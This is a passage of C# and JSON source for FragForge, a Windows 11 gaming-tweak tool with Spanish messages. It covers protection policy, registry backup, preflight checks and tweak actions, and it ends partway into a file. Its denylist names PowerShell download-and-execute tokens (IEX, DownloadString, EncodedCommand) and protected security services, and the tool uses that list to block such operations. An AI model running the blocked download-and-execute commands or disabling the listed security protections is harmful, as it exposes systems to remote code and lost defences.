        if (reduced.StartsWith("%systemroot%\\", StringComparison.OrdinalIgnoreCase) && !reduced.StartsWith("%systemroot%\\system32\\config\\systemprofile", StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException(full, "solo se permiten archivos de configuración de usuario/juego, nunca rutas de Windows");
        if (full.EndsWith(".sys", StringComparison.OrdinalIgnoreCase) || full.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) || full.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException(full, "FileEdit solo admite archivos de configuración de texto");
    }
    public void EnsurePowerShellAllowed(string script)
    {
        foreach (var token in _document.PowerShellDeniedTokens)
            if (script.Contains(token, StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException("PowerShell", $"token bloqueado '{token}'");
        if (script.Contains("http://", StringComparison.OrdinalIgnoreCase) || script.Contains("https://", StringComparison.OrdinalIgnoreCase)) throw new ProtectedTargetException("PowerShell", "acceso de red prohibido");
    }
    public void EnsureNetworkPropertyAllowed(string adapterName, string keyword)
    {
        if (_document.NetworkPropertyKeywords.Contains(keyword, StringComparer.OrdinalIgnoreCase)) throw new ProtectedTargetException($"{adapterName}:{keyword}", "propiedad de red fuera del alcance seguro de Capa 0");
        if (keyword.Length is 0 or > 128) throw new ProtectedTargetException(keyword, "se requiere una palabra clave exacta");
        var stripped = keyword.StartsWith('*') ? keyword[1..] : keyword;
        if (stripped.Contains('*') || stripped.Contains('?') || stripped.Length == 0) throw new ProtectedTargetException(keyword, "solo se admite el prefijo '*' del controlador; sin otros comodines");
    }
    private static string PolicyPath(string path)
    {
        var expanded = Environment.ExpandEnvironmentVariables(path).Replace('/', '\\');
        var systemRoot = Environment.GetFolderPath(Environment.SpecialFolder.Windows)?.Replace('/', '\\');
        if (!string.IsNullOrEmpty(systemRoot)) expanded = expanded.Replace(systemRoot.TrimEnd('\\'), "%SystemRoot%", StringComparison.OrdinalIgnoreCase);
        var marker = expanded.IndexOf("\\windows\\", StringComparison.OrdinalIgnoreCase);
        if (marker >= 0) expanded = "%SystemRoot%" + expanded[(marker + "\\windows".Length)..];
        return expanded.Replace("%SYSTEMROOT%", "%SystemRoot%", StringComparison.OrdinalIgnoreCase).Replace("\\", "\\");
    }
    private static string NormalizePrefix(string prefix) => RegistryPath.Canonicalize(Environment.ExpandEnvironmentVariables(prefix));
    private static bool MatchesPrefix(string value, string prefix) => value.Equals(prefix, StringComparison.OrdinalIgnoreCase) || value.StartsWith(prefix + "\\", StringComparison.OrdinalIgnoreCase);
    [GeneratedRegex(@"^HKLM\\SYSTEM\\(?:CurrentControlSet|ControlSet\d{3})\\SERVICES\\([^\\]+)", RegexOptions.IgnoreCase)]
    private static partial Regex ServiceKeyRegex();
}

public sealed record PolicyDocument
{
    public int SchemaVersion { get; init; } = 1;
    public List<string> Services { get; init; } = [];
    public List<string> RegistryKeyPrefixes { get; init; } = [];
    public List<string> RegistryValueNames { get; init; } = [];
    public List<string> TaskPrefixes { get; init; } = [];
    public List<string> BcdDenyElements { get; init; } = [];
    public List<string> BcdAllowedElements { get; init; } = ["disabledynamictick"];
    public List<string> FilePrefixes { get; init; } = [];
    public List<string> NetworkPropertyKeywords { get; init; } = [];
    public List<string> PowerShellDeniedTokens { get; init; } = [];
    public IEnumerable<string> ValueNames() => RegistryValueNames;
}
````

### `src/FragForge.Core/Persistence/RegistryBackupExporter.cs`  <sub>(38 líneas)</sub>

````csharp
using System.Globalization;
using System.Text;
using FragForge.Core.Models;

namespace FragForge.Core.Persistence;

public static class RegistryBackupExporter
{
    public static async Task WriteAsync(string path, IEnumerable<RegistryActionState> states, CancellationToken cancellationToken = default)
    {
        var builder = new StringBuilder("Windows Registry Editor Version 5.00\r\n\r\n; FragForge scoped value backup. Absent values are represented by value deletion, never whole-key deletion.\r\n");
        foreach (var state in states)
        foreach (var value in state.Values)
        {
            cancellationToken.ThrowIfCancellationRequested();
            builder.Append('[').Append(RegistryPath.ToFullRoot(value.Key)).Append("]\r\n");
            var name = value.Name.Length == 0 ? "@" : "\"" + Escape(value.Name) + "\"";
            if (!value.ValueExisted) { builder.Append(name).Append("=-\r\n\r\n"); continue; }
            builder.Append(name).Append('=');
            switch (value.ValueKind)
            {
                case "String": builder.Append('"').Append(Escape(value.StringData ?? "")).Append('"'); break;
                case "ExpandString": builder.Append("hex(2):").Append(BytesHex(Encoding.Unicode.GetBytes((value.StringData ?? "") + "\0"))); break;
                case "DWord": builder.Append("dword:").Append(((uint)(value.IntegerData ?? 0)).ToString("x8", CultureInfo.InvariantCulture)); break;
                case "QWord": builder.Append("hex(b):").Append(BytesHex(BitConverter.GetBytes(unchecked((ulong)(value.IntegerData ?? 0))))); break;
                case "Binary": builder.Append("hex:").Append(BytesHex(Convert.FromBase64String(value.BinaryBase64 ?? ""))); break;
                case "MultiString":
                    var text = string.Join("\0", value.MultiStringData ?? []) + "\0\0";
                    builder.Append("hex(7):").Append(BytesHex(Encoding.Unicode.GetBytes(text))); break;
                default: throw new InvalidDataException($"Unsupported registry kind '{value.ValueKind}'.");
            }
            builder.Append("\r\n\r\n");
        }
        await File.WriteAllTextAsync(path, builder.ToString(), Encoding.Unicode, cancellationToken);
    }
    private static string Escape(string value) => value.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
    private static string BytesHex(byte[] bytes) => string.Join(",", bytes.Select(b => b.ToString("x2", CultureInfo.InvariantCulture)));
}
````

### `src/FragForge.Core/Persistence/RegistryPath.cs`  <sub>(44 líneas)</sub>

````csharp
namespace FragForge.Core.Persistence;

public static class RegistryPath
{
    public static string Canonicalize(string key)
    {
        if (string.IsNullOrWhiteSpace(key) || key.Contains('\0') || key.Length > 32767) throw new ArgumentException("Invalid registry key.", nameof(key));
        var parts = key.Trim().TrimEnd('\\').Split('\\');
        parts[0] = parts[0].ToUpperInvariant() switch
        {
            "HKEY_LOCAL_MACHINE" or "HKLM" => "HKLM",
            "HKEY_CURRENT_USER" or "HKCU" => "HKCU",
            "HKEY_USERS" or "HKU" => "HKU",
            "HKEY_CLASSES_ROOT" or "HKCR" => "HKCR",
            "HKEY_CURRENT_CONFIG" or "HKCC" => "HKCC",
            _ => throw new ArgumentException($"Unsupported registry root '{parts[0]}'.", nameof(key))
        };
        if (parts.Any(p => p is "." or "..")) throw new ArgumentException("Relative registry segments are not allowed.", nameof(key));
        return string.Join('\\', parts);
    }
    public static string ToFullRoot(string key)
    {
        var canonical = Canonicalize(key);
        return canonical.StartsWith("HKLM\\", StringComparison.Ordinal) ? "HKEY_LOCAL_MACHINE" + canonical[4..]
            : canonical.StartsWith("HKCU\\", StringComparison.Ordinal) ? "HKEY_CURRENT_USER" + canonical[4..]
            : canonical.StartsWith("HKU\\", StringComparison.Ordinal) ? "HKEY_USERS" + canonical[3..]
            : canonical.StartsWith("HKCR\\", StringComparison.Ordinal) ? "HKEY_CLASSES_ROOT" + canonical[4..]
            : "HKEY_CURRENT_CONFIG" + canonical[4..];
    }
    public static string ResolveUserHive(string key, string? userSid)
    {
        var canonical = Canonicalize(key);
        if (!canonical.StartsWith("HKCU\\", StringComparison.Ordinal)) return canonical;
        if (string.IsNullOrWhiteSpace(userSid)) throw new InvalidOperationException("The interactive user SID is required for HKCU actions.");
        if (!userSid.StartsWith("S-1-", StringComparison.Ordinal) || userSid.Contains('\\') || userSid.Contains('/') || userSid.Contains("..")) throw new ArgumentException("Invalid user SID.", nameof(userSid));
        return "HKU\\" + userSid + canonical[4..];
    }
    public static IEnumerable<string> AncestorsFromRoot(string key)
    {
        var canonical = Canonicalize(key);
        var parts = canonical.Split('\\');
        for (var i = parts.Length; i >= 2; i--) yield return string.Join('\\', parts.Take(i));
    }
}
````

### `src/FragForge.Core/Policy/denylist.json`  <sub>(53 líneas)</sub>

````json
{
  "schemaVersion": 1,
  "services": [
    "WinDefend", "WdNisSvc", "SecurityHealthService", "Sense", "WebThreatDefSvc", "wscsvc",
    "mpssvc", "BFE", "RpcSs", "DcomLaunch", "PlugPlay", "Power", "EventLog", "CryptSvc",
    "TrustedInstaller", "Winmgmt", "ProfSvc", "gpsvc", "SamSs", "Schedule", "SENS",
    "Dnscache", "Dhcp", "NlaSvc", "nsi", "netprofm", "NcbService", "BrokerInfrastructure",
    "CoreMessagingRegistrar", "StateRepository", "SystemEventsBroker", "TimeBrokerSvc",
    "TokenBroker", "UserManager", "ShellHwDetection", "wuauserv", "UsoSvc", "WaaSMedicSvc",
    "BITS", "DoSvc", "TBS", "KeyIso", "VaultSvc", "EFS", "iphlpsvc", "WinHttpAutoProxySvc",
    "ipfsvc", "jhi_service", "cplspcon", "WMIRegistrationService"
  ],
  "registryKeyPrefixes": [
    "HKLM\\SOFTWARE\\Microsoft\\Windows Defender",
    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
    "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",
    "HKLM\\SOFTWARE\\Microsoft\\WindowsUpdate",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
    "HKLM\\BCD00000000"
  ],
  "registryValueNames": [ "Debugger", "GlobalFlag", "VerifierDlls", "VerifierFlags", "MitigationOptions", "MitigationAuditOptions", "DisableExceptionChainValidation" ],
  "taskPrefixes": [
    "\\Microsoft\\Windows\\Windows Defender",
    "\\Microsoft\\Windows\\WindowsUpdate",
    "\\Microsoft\\Windows\\UpdateOrchestrator",
    "\\Microsoft\\Windows\\BitLocker",
    "\\Microsoft\\Windows\\TPM",
    "\\Microsoft\\Windows\\CertificateServicesClient"
  ],
  "bcdDenyElements": [ "testsigning", "nointegritychecks", "hypervisorlaunchtype", "nx", "pae", "safeboot", "bootstatuspolicy", "recoveryenabled", "isolatedcontext", "vsmlaunchtype", "loadoptions", "path", "device", "osdevice" ],
  "bcdAllowedElements": [ "disabledynamictick" ],
  "filePrefixes": [
    "%SystemRoot%\\System32\\config",
    "%SystemRoot%\\System32\\drivers",
    "%SystemRoot%\\System32\\drivers\\etc\\hosts",
    "%SystemRoot%\\System32\\DriverStore",
    "%SystemRoot%\\Boot",
    "%ProgramData%\\Microsoft\\Windows Defender",
    "%SystemDrive%\\Boot",
    "%SystemDrive%\\bootmgr",
    "%SystemDrive%\\$WINDOWS.~BT"
  ],
  "networkPropertyKeywords": [ "*DeviceSleepOnDisconnect", "*WakeOnMagicPacket", "*WakeOnPattern", "*NetworkAddress", "*FlowControl", "*RSS", "*RscIPv4", "*RscIPv6", "*InterruptModeration" ],
  "powerShellDeniedTokens": [ "Invoke-Expression", "IEX", "DownloadString", "DownloadFile", "Invoke-WebRequest", "Invoke-RestMethod", "FromBase64String", "EncodedCommand", "Add-Type", "Start-Process", "Restart-Computer", "Stop-Computer", "Set-MpPreference", "Set-NetFirewallProfile", "bcdedit", "reg.exe", "sc.exe", "vssadmin", "WinDefend", "mpssvc", "BFE", "ipfsvc", "jhi_service", "cplspcon", "WMIRegistrationService" ]
}
````

### `src/FragForge.Core/Preflight/PreflightService.cs`  <sub>(34 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Core.Preflight;

public sealed class PreflightService(ISystemRestoreService restore, ITweakCatalog catalog) : IPreflightService
{
    public const ulong MinimumFreeBytes = 512UL * 1024 * 1024;
    public async Task<PreflightReport> CheckAsync(ApplyOptions options, HardwareProfile profile, CancellationToken cancellationToken = default)
    {
        var checks = new List<PreflightCheck>();
        if (options.DryRun)
        {
            checks.Add(new("dry-run", PreflightSeverity.Info, "Simulación: no se modificará el sistema ni se creará un punto de restauración."));
            return PreflightReport.Passed(checks);
        }
        checks.Add(profile.IsUnsupportedPlatform ? new("platform", PreflightSeverity.Blocking, "Las acciones reales requieren Windows 11 x64.", "Ejecuta FragForge en el equipo objetivo.") : new("platform", PreflightSeverity.Info, "Plataforma Windows detectada."));
        checks.Add(profile.Os.Build is >= 26100 and <= 26299 ? new("os", PreflightSeverity.Info, $"Windows 11 build {profile.Os.Build} dentro del rango validado de Capa 0.") : new("os", PreflightSeverity.Blocking, $"Build {profile.Os.Build} fuera del rango 26100–26299.", "Actualiza el catálogo y valida compatibilidad antes de aplicar."));
        checks.Add(profile.Maintenance.IsAdministrator ? new("admin", PreflightSeverity.Info, "Proceso elevado.") : new("admin", PreflightSeverity.Blocking, "Se requieren privilegios de administrador.", "Acepta UAC o inicia la terminal como administrador."));
        if (profile.Maintenance.PendingReboot) checks.Add(new("reboot", PreflightSeverity.Blocking, "Hay un reinicio pendiente: " + string.Join("; ", profile.Maintenance.PendingRebootReasons), "Reinicia Windows y vuelve a escanear. Force no omite esta protección."));
        if (profile.Maintenance.WindowsServicingActive) checks.Add(new("servicing", PreflightSeverity.Blocking, "Windows Update/COMPONENTES está activo: " + string.Join(", ", profile.Maintenance.ServicingProcesses), "Espera a que termine TiWorker/TrustedInstaller; no los detengas."));
        checks.Add(profile.Maintenance.SystemDriveFreeBytes >= MinimumFreeBytes ? new("disk", PreflightSeverity.Info, $"Espacio libre: {profile.Maintenance.SystemDriveFreeBytes / 1024 / 1024} MiB.") : new("disk", PreflightSeverity.Blocking, "Menos de 512 MiB libres en la unidad de sistema.", "Libera espacio antes de crear snapshots o puntos de restauración."));
        checks.Add(catalog.Definitions.Count > 0 ? new("catalog", PreflightSeverity.Info, $"Catálogo válido: {catalog.Definitions.Count} tweaks.") : new("catalog", PreflightSeverity.Blocking, "El catálogo está vacío."));
        if (options.CreateRestorePoint)
        {
            var state = await restore.GetProtectionStateAsync(cancellationToken);
            if (state == FeatureState.Enabled) checks.Add(new("restore", PreflightSeverity.Info, "Protección del sistema habilitada."));
            else if (options.EnableSystemProtection && state != FeatureState.NotPresent) checks.Add(new("restore", PreflightSeverity.Warning, "La protección del sistema se habilitará para la unidad de sistema porque lo solicitaste explícitamente."));
            else checks.Add(new("restore", PreflightSeverity.Blocking, state == FeatureState.NotPresent ? "System Restore no está disponible en esta edición." : "La protección del sistema está desactivada o no pudo confirmarse.", "Habilítala en Protección del sistema o usa --enable-system-protection; --no-restore-point solo omite el punto, no el snapshot/journal."));
        }
        else checks.Add(new("restore", PreflightSeverity.Warning, "Punto de restauración omitido por opción explícita. El snapshot y journal siguen siendo obligatorios."));
        return PreflightReport.Passed(checks);
    }
}
````

---

## 3b. FragForge.Actions — código completo

### `src/FragForge.Actions/ActionParameters.cs`  <sub>(31 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Logging;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions;

internal static class ActionParameters
{
    public static T Parse<T>(ActionSpec specification)
    {
        var json = specification.Parameters.ValueKind == JsonValueKind.Undefined ? "{}" : specification.Parameters.GetRawText();
        try { return JsonSerializer.Deserialize<T>(json, JsonDefaults.Options) ?? throw new JsonException("Null action parameters."); }
        catch (JsonException ex) { throw new CatalogValidationException($"Parámetros inválidos para la acción '{specification.Kind}'.", [ex.Message]); }
    }
    public static string ResolveToken(string value, ActionExecutionContext context) => value switch
    {
        "{Cs2Executable}" => context.Hardware.Games.Cs2ExecutablePath ?? throw new ActionNotApplicableException("No se detectó cs2.exe; usa la ruta manual."),
        "{Cs2Directory}" => Path.GetDirectoryName(context.Hardware.Games.Cs2ExecutablePath ?? throw new ActionNotApplicableException("No se detectó CS2."))!,
        _ => value
    };
}
internal sealed record RegistryActionParameters { public IReadOnlyList<RegistryValueTarget> Values { get; init; } = []; }
internal sealed record RegistryValueTarget
{
    public required string Key { get; init; }
    public required string Name { get; init; }
    public required string Kind { get; init; }
    public JsonElement Value { get; init; }
    public string Mode { get; init; } = "Set";
}
````

### `src/FragForge.Actions/Bcd/BcdeditAction.cs`  <sub>(68 líneas)</sub>

````csharp
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Bcd;

public sealed class BcdeditAction(IProcessRunner runner, IProtectionPolicy policy, ActionSpec specification) : ITweakAction
{
    private readonly BcdParameters _parameters = ActionParameters.Parse<BcdParameters>(specification);
    public string Kind => "Bcdedit";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        policy.EnsureBcdAllowed(_parameters.Element);
        if (_parameters.Element != _parameters.Element.ToLowerInvariant() || Regex.IsMatch(_parameters.Element, "[^a-z0-9]")) throw new CatalogValidationException("Invalid BCD element.", [_parameters.Element]);
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        policy.EnsureBcdAllowed(_parameters.Element);
        var result = await runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable("bcdedit.exe"), Arguments = ["/enum", "{current}", "/v"], Timeout = TimeSpan.FromSeconds(60) }, cancellationToken);
        if (result.TimedOut) throw new ProcessFailedException("bcdedit.exe", result.ExitCode, "timeout");
        var match = Regex.Match(result.StandardOutput, @"^\s*" + Regex.Escape(_parameters.Element) + @"\s+(.+?)\s*$", RegexOptions.Multiline | RegexOptions.IgnoreCase);
        string? export = null;
        if (context.ArtifactDirectory is not null)
        {
            export = $"bcd-{_parameters.Element}.bcd";
            var target = Path.Combine(context.ArtifactDirectory, export);
            if (File.Exists(target)) throw new InvalidOperationException($"Ya existe la exportación BCD '{target}'; no se sobrescribe una copia de recuperación.");
            await RunAsync(["/export", target], cancellationToken);
            if (!File.Exists(target)) throw new InvalidOperationException("bcdedit /export no produjo el archivo de recuperación; no se aplicará el cambio BCD.");
        }
        return new BcdActionState { Element = _parameters.Element, Existed = match.Success, PreviousValue = match.Success ? match.Groups[1].Value : null, ExportArtifact = export ?? "" };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (BcdActionState)before;
        if (string.IsNullOrEmpty(state.ExportArtifact)) throw new InvalidOperationException("BCD changes require a persisted bcdedit /export backup.");
        policy.EnsureBcdAllowed(_parameters.Element);
        await RunAsync(["/set", "{current}", _parameters.Element, _parameters.Value], cancellationToken);
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var current = await CaptureAsync(context with { ArtifactDirectory = null }, cancellationToken);
        var state = (BcdActionState)current;
        return state.Existed && string.Equals(state.PreviousValue, _parameters.Value, StringComparison.OrdinalIgnoreCase) ? VerificationResult.Match($"BCD {_parameters.Element}={_parameters.Value}.") : VerificationResult.Missing("BCD no coincide.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (BcdActionState)before;
        policy.EnsureBcdAllowed(state.Element);
        if (state.Existed) await RunAsync(["/set", "{current}", state.Element, state.PreviousValue ?? ""], cancellationToken);
        else await RunAsync(["/deletevalue", "{current}", state.Element], cancellationToken);
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (BcdActionState)before;
        var current = (BcdActionState)await CaptureAsync(context with { ArtifactDirectory = null }, cancellationToken);
        return current.Existed == state.Existed && string.Equals(current.PreviousValue, state.PreviousValue, StringComparison.OrdinalIgnoreCase) ? VerificationResult.Match("BCD restaurado.") : VerificationResult.Missing("BCD no volvió al estado capturado.");
    }
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult($"BCD {{current}} {_parameters.Element}={_parameters.Value}; exportación completa previa; revert restaura o elimina el elemento. Requiere Advanced y doble confirmación.");
    private async Task<ProcessResult> RunAsync(IReadOnlyList<string> arguments, CancellationToken cancellationToken)
    {
        var result = await runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable("bcdedit.exe"), Arguments = arguments, Timeout = TimeSpan.FromSeconds(60) }, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("bcdedit.exe", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError + result.StandardOutput);
        return result;
    }
}
internal sealed record BcdParameters { public required string Element { get; init; } public required string Value { get; init; } }
````

### `src/FragForge.Actions/DependencyInjection/ServiceCollectionExtensions.cs`  <sub>(18 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Actions.Diagnostics;
using FragForge.Actions.Registry;
using Microsoft.Extensions.DependencyInjection;

namespace FragForge.Actions.DependencyInjection;

public static class ServiceCollectionExtensions
{
    public static IServiceCollection AddFragForgeActions(this IServiceCollection services)
    {
        services.AddSingleton<IProtectionPolicy>(Core.Persistence.ProtectionPolicy.CreateDefault());
        services.AddSingleton<IRegistry>(sp => OperatingSystem.IsWindows() ? new ProtectedRegistry(new WindowsRegistry(), sp.GetRequiredService<IProtectionPolicy>()) : new ProtectedRegistry(new UnsupportedRegistry(), sp.GetRequiredService<IProtectionPolicy>()));
        services.AddSingleton<ITweakActionFactory, TweakActionFactory>();
        services.AddSingleton<IEnumerable<IDiagnosticProbe>>(sp => DiagnosticProbeFactory.CreateDefaults(sp.GetRequiredService<IRegistry>()));
        return services;
    }
}
````

### `src/FragForge.Actions/DependencyInjection/TweakActionFactory.cs`  <sub>(37 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Actions.Bcd;
using FragForge.Actions.Diagnostics;
using FragForge.Actions.Files;
using FragForge.Actions.Network;
using FragForge.Actions.Power;
using FragForge.Actions.Registry;
using FragForge.Actions.Scripting;
using FragForge.Actions.Services;
using FragForge.Actions.Tasks;

namespace FragForge.Actions.DependencyInjection;

public sealed class TweakActionFactory(IRegistry registry, IProtectionPolicy policy, IServiceController services, IScheduledTaskStore tasks, INetworkAdapterController network, IProcessRunner runner, IEnumerable<IDiagnosticProbe> probes) : ITweakActionFactory
{
    private readonly IReadOnlyList<IDiagnosticProbe> _probes = probes.ToArray();
    public IReadOnlySet<string> SupportedKinds { get; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "Registry", "IfeoPerfOptions", "Service", "ScheduledTask", "PowerPlan", "Bcdedit", "NetAdapterProperty", "FileEdit", "PowerShell", "InspectOnly" };
    public ITweakAction Create(ActionSpec specification)
    {
        if (!SupportedKinds.Contains(specification.Kind)) throw new CatalogValidationException($"Acción desconocida '{specification.Kind}'.", [specification.Kind]);
        return specification.Kind.ToLowerInvariant() switch
        {
            "registry" => new RegistryAction(registry, policy, specification),
            "ifeoperfoptions" => new IfeoPerfOptionsAction(registry, policy, specification),
            "service" => new ServiceAction(services, policy, specification),
            "scheduledtask" => new ScheduledTaskAction(tasks, policy, specification),
            "powerplan" => new PowerPlanAction(runner, specification),
            "bcdedit" => new BcdeditAction(runner, policy, specification),
            "netadapterproperty" => new NetAdapterPropertyAction(network, policy, specification),
            "fileedit" => new FileEditAction(policy, specification),
            "powershell" => new PowerShellAction(runner, policy, specification),
            "inspectonly" => new InspectOnlyAction(_probes, specification),
            _ => throw new CatalogValidationException($"Acción desconocida '{specification.Kind}'.", [specification.Kind])
        };
    }
}
````

### `src/FragForge.Actions/Diagnostics/DiagnosticProbes.cs`  <sub>(34 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Diagnostics;

public sealed class RegistryDiagnosticProbe(string key, IRegistry registry, string path, string name, Func<RegistryReadResult, (string Value, string Note)> interpret) : IDiagnosticProbe
{
    public string Key { get; } = key;
    public async Task<DiagnosticObservation> ReadAsync(HardwareProfile profile, CancellationToken cancellationToken = default)
    {
        var result = await registry.ReadValueAsync(path, name, cancellationToken);
        var (value, note) = interpret(result);
        return new DiagnosticObservation(Key, value, path + "\\" + name, result.ValueExists ? "High" : "Unknown", note);
    }
}
public sealed class ProfileDiagnosticProbe(string key, Func<HardwareProfile, DiagnosticObservation> read) : IDiagnosticProbe
{
    public string Key { get; } = key;
    public Task<DiagnosticObservation> ReadAsync(HardwareProfile profile, CancellationToken cancellationToken = default) => Task.FromResult(read(profile));
}
public static class DiagnosticProbeFactory
{
    public static IReadOnlyList<IDiagnosticProbe> CreateDefaults(IRegistry registry) =>
    [
        new RegistryDiagnosticProbe("hags", registry, @"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers", "HwSchMode", r => !r.ValueExists ? ("Unknown/default", "Ausente significa comportamiento predeterminado del controlador; no equivale necesariamente a desactivado.") : (Convert.ToString(r.Data) == "2" ? "Enabled" : Convert.ToString(r.Data) == "1" ? "Disabled" : $"Unknown ({r.Data})", "HwSchMode observado; no se modifica.")),
        new RegistryDiagnosticProbe("mpo", registry, @"HKLM\SOFTWARE\Microsoft\Windows\Dwm", "OverlayTestMode", r => !r.ValueExists ? ("Unknown/default", "Ausente no prueba el estado efectivo de MPO; no se modifica.") : (Convert.ToString(r.Data) == "5" ? "DisabledByOverride" : $"Override={r.Data}", "OverlayTestMode=5 es el override conocido; otros valores requieren diagnóstico.")),
        new ProfileDiagnosticProbe("vbs", p => new("vbs", p.Security.Vbs.ToString(), "DeviceGuard/WMI", p.Security.Vbs == FeatureState.Unknown ? "Unknown" : "Medium", "No se cambia VBS en el perfil por defecto.")),
        new ProfileDiagnosticProbe("hvci", p => new("hvci", p.Security.Hvci.ToString(), "DeviceGuard/registro", p.Security.Hvci == FeatureState.Unknown ? "Unknown" : "Medium", "No se cambia HVCI en el perfil por defecto.")),
        new ProfileDiagnosticProbe("secureBoot", p => new("secureBoot", p.Security.SecureBoot.ToString(), "Registro/UEFI", p.Security.SecureBoot == FeatureState.Unknown ? "Unknown" : "Medium", "Solo lectura.")),
        new ProfileDiagnosticProbe("dualChannel", p => new("dualChannel", p.Memory.Channels.ToString(), "Win32_PhysicalMemory", p.Memory.Channels == MemoryChannelState.Unknown ? "Unknown" : "Medium", p.Memory.ChannelEvidence + " Dos módulos no prueban dual-channel.")),
        new ProfileDiagnosticProbe("powerLimits", p => new("powerLimits", $"PL1={p.Power.Pl1Watts?.ToString() ?? "Unknown"} W; PL2={p.Power.Pl2Watts?.ToString() ?? "Unknown"} W", p.Power.PowerLimitSource, "Unknown", "DTT/IPF puede gobernar límites dinámicos; no se inventan valores.")),
        new ProfileDiagnosticProbe("ssdHealth", p => new("ssdHealth", string.Join("; ", p.Disks.Select(d => $"{d.Model}: {d.Health}, SMART={(d.SmartPredictFailure?.ToString() ?? "Unavailable")}")), "WMI/MSFT_PhysicalDisk", "Medium", "Salud básica, no sustituye un análisis SMART completo."))
    ];
}
````

### `src/FragForge.Actions/Diagnostics/InspectOnlyAction.cs`  <sub>(38 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Diagnostics;

public sealed class InspectOnlyAction : ITweakAction
{
    private readonly IReadOnlyList<IDiagnosticProbe> _probes;
    private readonly InspectionParameters _parameters;
    public string Kind => "InspectOnly";
    public InspectOnlyAction(IEnumerable<IDiagnosticProbe> probes, ActionSpec specification)
    {
        _parameters = ActionParameters.Parse<InspectionParameters>(specification);
        var available = probes.ToArray();
        var keys = _parameters.Probes.Count == 0 ? available.Select(p => p.Key).ToArray() : _parameters.Probes;
        var missing = keys.Except(available.Select(p => p.Key), StringComparer.OrdinalIgnoreCase).ToArray();
        if (missing.Length > 0) throw new CatalogValidationException("Unknown diagnostic probes.", missing);
        _probes = available.Where(p => keys.Contains(p.Key, StringComparer.OrdinalIgnoreCase)).ToArray();
    }
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.CompletedTask;
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var observations = new List<DiagnosticObservation>();
        foreach (var probe in _probes)
        {
            cancellationToken.ThrowIfCancellationRequested();
            try { observations.Add(await probe.ReadAsync(context.Hardware, cancellationToken)); }
            catch (Exception ex) when (ex is not OperationCanceledException) { observations.Add(new DiagnosticObservation(probe.Key, "Unknown", probe.GetType().Name, "Unknown", ex.Message)); }
        }
        return new InspectionActionState { Observations = observations };
    }
    public Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.CompletedTask;
    public Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult(new VerificationResult(VerificationOutcome.Unknown, "Solo lectura: no hay estado objetivo que verificar."));
    public Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.CompletedTask;
    public Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult(VerificationResult.Match("InspectOnly no realizó cambios."));
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult("Solo lectura, cero escrituras. Sondear: " + string.Join(", ", _probes.Select(p => p.Key)) + ".");
}
internal sealed record InspectionParameters { public IReadOnlyList<string> Probes { get; init; } = []; }
````

### `src/FragForge.Actions/Files/FileEditAction.cs`  <sub>(100 líneas)</sub>

````csharp
using System.Text;
using System.Text.RegularExpressions;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;

namespace FragForge.Actions.Files;

